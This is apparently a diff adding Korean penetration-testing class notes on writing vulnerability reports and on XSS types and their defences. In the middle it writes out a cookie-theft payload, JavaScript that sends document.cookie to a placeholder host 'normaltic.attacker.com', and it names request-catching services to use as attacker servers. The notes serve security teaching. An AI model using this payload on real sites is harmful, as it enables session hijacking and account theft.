@@ -1,0 +1,181 @@
+보고서
+
+1. 보고서 word
+> notion, pdf
+
+> 한글 hwp X
+-> PDF
+
+표 크기가 동일 하면 좋다.
+사진도 통일 해주면 좋다.
+그림을 넣을 때는 테두리를 넣는 것이 좋다.
+
+보고서를 쓸 떄는 캡쳐화면을 많이 넣어야 함
+빨간색 박스 넣어도 됨
+
+취약점이 어디에서 발견되는지 적는게 중요
+(발견 경로 : 메인 페이지 > 공지사항 > 게시글 작성)
+
+~ 함. ~ 있음
+~ 합니다. ~ 있습니다.
+둘중에 하나만
+
+무조건 캡쳐는 웹 브라우저 전체를 캡쳐해야함
+
+보고서 : 
+
+XSS
+경고창 1이 떴다.
+경고창 1이 발생했다.
+-> 이렇게 쓰는 것이 아니라 이것이 어떤 취약점으로 이어지는지
+alert(1)
+
+* 보고서를 이쁘게 쓴다.
+=> 업무 능력.
+
+__________________________________
+
+* XSS
+> 클라이언트 측 스크립트 삽입.
+
+웹 브라우저에서 실행 : Javascript
+
+실행 위치
+> 피해자의 웹 브라우저
+
+1. Stored XSS
+-> 서버에 저장.
+
+게시판.
+
+<script>badCode</script>
+
+2. Reflected XSS
+> 서버에서 반사되는 특징.
+
+normaltic
+
+alert(1)
+-> 이거를 공격에 어떻게 이용하지?
+
+(tip)XSS, CSRF
+1인 2역
+_________
+
+임의의 스크립트 삽입.
+alert(1)
+alert(document.cookie)
+alert('xss')
+
+위의 코드 대신에 아래의 코드를 작성하기 위해 배운다!
+
+COOKIE 탈취.
+세션 ID가 쿠키에 저장이 되기 때문에
+COOKIE 탈취는 공격 Point가 된다.
+
+javascript
+var cookieData = document.cookie;
+-> 웹 페이지에 있는 쿠키 값을 가져오는 코드, 그리고 cookieData라는 변수에 담음
+
+var i = new Image();
+-> html에서 이미지 태크를 생성하는 코드
+i.src = "http://normaltic.attacker.com/?cookie=" + "Secret_data";
+-> 소스 속성에 위의 url이 들어가게 됨
+
+<img src="http://normaltic.attacker.com/?cookie=임의의 쿠키값">
+이와 같이 들어감
+
+i.src = "http://normaltic.attacker.com/?cookie=" + "cookieData";
+<img src="http://normaltic.attacker.com/?cookie=">
+
+
+<img src="http://normaltic.attacker.com">
+
+http://normaltic.attacker.com/?cookie=Secret_data;
+
+
+
+<정리>
+
+var cookieData = document.cookie;
+
+var i = new Image();
+i.src = "http://normaltic.attacker.com/
+getCred.php?cookie=" + cookieData;
+
+<img src="http://normaltic.attacker.com/
+get.Cred.php?cookie=efjiewjfiewjfiji">
+
+
+공격자 서버
+VPS를 사는게 좋지만.
+
+https://public.requestbin.com/r/
+를 VPS 대신 공격자 서버로 사용할 수 있음
+
+https://en9iyez72g5ob.x.pipedream.net?cookie=test
+
+__________________________________
+
+문제 풀이는 part 4 영상 참고
+
+XSS
+클라이언트 측 스크립트
+
+HTML
+
+cookie
+key logger
+
+Stored XSS - 저장하는 곳
+
+Reflected XSS - burp에서 parameter의 데이터가 찍히는 곳을 찾기
+
+DOM Based XSS - 어느정도 분석을 하는데 키워드들을 찾기
+> 브라우저에서 조립되어서 script 실행.
+
+-> document.write = "";
+-> innerHTML 이라는 속성으로 태그를 직접 만들 수 있음
+
+위의 키워드들을 찾기
+화면에는 보이는데 응답에는 없으면, 어딘가 자바스크립트가 검색어를 쓰고 있음.
+
+javascript로 tag를 만들 수 있다.
+(자바스크립트로 자바스크립트를 만들 수 있다)
+
+<script>
+
+</script>
+
+입력을 했는데 서버에 전달을 해준 적이 없음.
+
+* 대응방안.
+xss : 막는 법!
+HTML 특수문자를 HTML Entity 표현 치환.
+< "" '' >
+
+필터링.
+
+>_<
+
+해결 방법 : HTML Entity
+&lt; : <
+
+<html>
+  >_<
+</html>
+
+꺽쇠가 없어도 크사를 쓸 수 있음
+XSS 2
+
+과제
+1. 오늘 수업 정리
+XSS - Cookie 탈취.
+
+2. XSS 문제 풀이
+-> 보고서 작성하기
+
+3. XSS 공격 시나리오 연구.
+-> 블로그
+
+4. 웹 개발.
